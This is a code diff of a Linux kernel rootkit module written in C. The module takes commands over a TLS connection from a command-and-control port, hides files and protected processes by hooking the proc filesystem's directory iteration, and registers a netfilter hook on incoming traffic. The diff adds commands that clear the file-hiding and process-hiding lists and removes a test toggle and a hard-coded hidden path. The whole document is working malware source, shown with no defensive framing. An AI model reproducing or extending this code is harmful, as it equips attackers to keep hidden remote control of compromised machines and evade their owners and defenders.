@@ -321,6 +321,8 @@ void read_TLS(struct work_struct* work) {
     const char* clear = "All port settings cleared\n";
     const char* bad_drop = "Unable to close the C2 port\n";
     const char* bad_file = "Invalid hidden file path\n";
+    const char* clearf = "All file hiding cleared\n";
+    const char* clearp = "All unkillable proc hiding cleared\n";
 
     memset(buffer, 0, MAX_PAYLOAD);
     len = recv_msg(svc->tls_socket, buffer, MAX_PAYLOAD);
@@ -361,18 +363,22 @@ void read_TLS(struct work_struct* work) {
         buffer[0] = 'm';
         strcpy(buffer + 1, close);
         send_msg(svc->tls_socket, buffer, strlen(close) + 1);
+    } else if (memcmp("clearf", buffer, 6) == 0) {
+        hidden_file_count = 0;
+        buffer[0] = 'm';
+        strcpy(buffer + 1, clearf);
+        send_msg(svc->tls_socket, buffer, strlen(clearf) + 1);
+    } else if (memcmp("clearp", buffer, 6) == 0) {
+        hidden_kill_count = 0;
+        buffer[0] = 'm';
+        strcpy(buffer + 1, clearp);
+        send_msg(svc->tls_socket, buffer, strlen(clearp) + 1);
     } else if (memcmp("clear", buffer, 5) == 0) {
         open_port_count = 0;
         closed_port_count = 0;
         buffer[0] = 'm';
         strcpy(buffer + 1, clear);
         send_msg(svc->tls_socket, buffer, strlen(clear) + 1);
-    } else if (memcmp("test", buffer, 4) == 0) {
-        if (hidden) {
-            show();
-        } else {
-            hide();
-        }
     } else if (memcmp("kill", buffer, 4) == 0) {
         printk(KERN_INFO "Killswitch engaged\n");
         show();
@@ -761,11 +767,6 @@ static int __init mod_init(void) {
     backup_proc_fops = (struct file_operations*) proc_inode->i_fop;
     proc_fops.iterate_shared = proc_iterate_shared;
     proc_inode->i_fop = &proc_fops;
-
-    const char* user_input = "/aing-matrix";
-    if (hide_file(user_input, hidden_files + hidden_file_count)) {
-        ++hidden_file_count;
-    }
 
     nfhi.hook = incoming_hook;
     nfhi.hooknum = NF_INET_LOCAL_IN;
